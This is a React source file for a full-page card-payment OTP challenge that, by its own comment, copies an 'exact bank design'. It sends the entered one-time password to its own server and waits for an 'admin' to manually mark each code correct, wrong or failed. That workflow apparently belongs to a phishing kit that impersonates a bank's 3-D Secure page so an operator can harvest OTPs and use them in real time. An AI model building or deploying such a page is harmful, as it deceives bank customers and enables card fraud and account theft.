import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
import { apiUrl } from '../lib/apiBase';

type Poll = {
  status?: string;
  phone_last3?: string | null;
  otp_attempts?: number;
  otp_max_attempts?: number;
  otp_remaining?: number;
  otp_can_resend?: boolean;
  otp_resend_cooldown_sec?: number;
  fail_reason?: string | null;
};

type OtpUiState = 'input' | 'checking' | 'failed' | 'completed' | 'declined';

function qs() {
  return new URLSearchParams(window.location.search);
}

/** Full-page ACS / 3DS — exact bank design only. Returns to merchant when done. */
export default function AcsChallengePage() {
  const params = useMemo(() => qs(), []);
  const orderRef = (params.get('order_ref') || params.get('order') || '').trim();
  const clientId = (params.get('client_id') || params.get('clientId') || '').trim();
  const lang = (params.get('lang') || 'ar').trim();
  const returnUrl = (params.get('return') || params.get('return_url') || '/').trim() || '/';

  const [phoneLast3, setPhoneLast3] = useState(
    params.get('digits') || params.get('phone_last3') || '',
  );
  const [otpRetryNotice, setOtpRetryNotice] = useState(false);
  const [otpResendNotice, setOtpResendNotice] = useState(false);
  const [otpResendCooldown, setOtpResendCooldown] = useState(0);
  const [otpResendLoading, setOtpResendLoading] = useState(false);
  const [otpState, setOtpState] = useState<OtpUiState>('input');
  const [failReason, setFailReason] = useState<string | null>(null);

  /** Last polled order status — used to detect transitions only */
  const prevStatusRef = useRef('');
  /** True after customer submits an OTP until admin marks correct/wrong/fail */
  const waitingResultRef = useRef(false);

  const goBack = useCallback(
    (status: string) => {
      try {
        sessionStorage.setItem(
          'acs_return',
          JSON.stringify({ order_ref: orderRef, status, at: Date.now() }),
        );
      } catch {
        /* ignore */
      }
      let target = returnUrl;
      try {
        const u = new URL(returnUrl, window.location.origin);
        u.searchParams.set('acs_result', status);
        if (orderRef) u.searchParams.set('order_ref', orderRef);
        target = u.toString();
      } catch {
        target = returnUrl;
      }
      window.location.replace(target);
    },
    [orderRef, returnUrl],
  );

  useEffect(() => {
    if (!orderRef || !clientId) return;
    let alive = true;
    const poll = async () => {
      try {
        const q = new URLSearchParams({ client_id: clientId, order_ref: orderRef });
        const res = await fetch(apiUrl(`/api/transactions/order-status?${q}`));
        if (!res.ok || !alive) return;
        const data = (await res.json()) as Poll;
        if (data.phone_last3) {
          setPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
        }
        if (typeof data.otp_resend_cooldown_sec === 'number') {
          setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
        }
        if (data.fail_reason) setFailReason(data.fail_reason);

        const st = String(data.status || '').toLowerCase();
        const prev = prevStatusRef.current;

        if (st === 'completed') {
          waitingResultRef.current = false;
          prevStatusRef.current = st;
          setOtpState('completed');
          window.setTimeout(() => goBack('completed'), 900);
          return;
        }

        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
          waitingResultRef.current = false;
          prevStatusRef.current = st;
          if (data.fail_reason === 'otp_attempts_exceeded') {
            setOtpState('failed');
            setFailReason('otp_attempts_exceeded');
          } else {
            setOtpState('declined');
            setFailReason(data.fail_reason || 'declined');
          }
          return;
        }

        if (st === 'retry_otp') {
          // Only handle NEW transition into retry_otp (wrong OTP result).
          // Do NOT re-fire every poll while status stays retry_otp — that breaks 2nd OTP.
          if (prev !== 'retry_otp') {
            waitingResultRef.current = false;
            setOtpState('input');
            setOtpRetryNotice(true);
          }
          prevStatusRef.current = st;
          return;
        }

        // pending / awaiting_otp after customer submitted — keep "---" / checking
        if (st === 'pending' || st === 'awaiting_otp') {
          prevStatusRef.current = st;
          if (waitingResultRef.current) {
            setOtpState('checking');
          }
          return;
        }

        prevStatusRef.current = st;
      } catch {
        /* ignore */
      }
    };
    void poll();
    const id = window.setInterval(() => void poll(), 1200);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [orderRef, clientId, goBack]);

  useEffect(() => {
    if (otpResendCooldown <= 0) return;
    const t = window.setInterval(() => setOtpResendCooldown((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearInterval(t);
  }, [otpResendCooldown]);

  const onMethodNext = async () => {
    if (!orderRef) return;
    await fetch(apiUrl('/api/transactions/otp/method-next'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: orderRef }),
    }).catch(() => null);
  };

  const onSubmitOtp = async (code: string) => {
    if (!orderRef) return;
    setOtpRetryNotice(false);
    setOtpResendNotice(false);
    waitingResultRef.current = true;
    setOtpState('checking');
    const res = await fetch(apiUrl('/api/transactions/otp'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: orderRef, otpDigit: code }),
    });
    if (!res.ok) {
      waitingResultRef.current = false;
      setOtpState('input');
      throw new Error('otp failed');
    }
    // Stay on checking until admin: completed / retry_otp / declined
  };

  const onClearRetryNotice = () => {
    setOtpRetryNotice(false);
  };

  const onResend = async () => {
    if (!orderRef || !clientId) return;
    setOtpResendLoading(true);
    try {
      const res = await fetch(apiUrl('/api/transactions/otp/resend'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: clientId, order_id: orderRef }),
      });
      if (res.ok) {
        const data = (await res.json()) as { cooldown_sec?: number };
        setOtpResendNotice(true);
        setOtpResendCooldown(data.cooldown_sec ?? 60);
      }
    } finally {
      setOtpResendLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#fff', margin: 0, padding: 0 }}>
      <AcsOtpChallenge
        orderRef={orderRef}
        phoneLast3={phoneLast3}
        lang={lang}
        otpRetryNotice={otpRetryNotice}
        otpResendNotice={otpResendNotice}
        resendCooldown={otpResendCooldown}
        resendLoading={otpResendLoading}
        externalState={otpState}
        failReason={failReason}
        onMethodNext={onMethodNext}
        onSubmitOtp={onSubmitOtp}
        onClearRetryNotice={onClearRetryNotice}
        onResend={onResend}
        onRetry={() => goBack('failed')}
        onCancel={() => goBack('cancelled')}
      />
    </div>
  );
}
